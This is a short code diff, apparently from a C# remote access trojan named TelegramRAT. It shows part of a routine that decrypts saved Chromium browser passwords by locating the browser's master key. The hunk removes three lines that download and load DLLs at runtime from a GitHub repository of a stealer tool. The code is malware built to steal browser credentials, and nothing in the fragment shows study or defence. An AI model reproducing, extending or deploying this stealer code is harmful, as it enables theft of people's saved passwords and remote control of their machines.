@@ -22,10 +22,6 @@ namespace TelegramRAT
             // If Chromium version > 80
             if (password.StartsWith("v10") || password.StartsWith("v11"))
             {
-                // Check dll's before decryption chromium passwords
-                core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/Sodium.dll");
-                core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium.dll");
-                core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium-64.dll");
                 // Get masterkey location
                 string masterKey, masterKeyPath = "";
                 foreach (string l_s in new string[] { "", "\\..", "\\..\\.." })
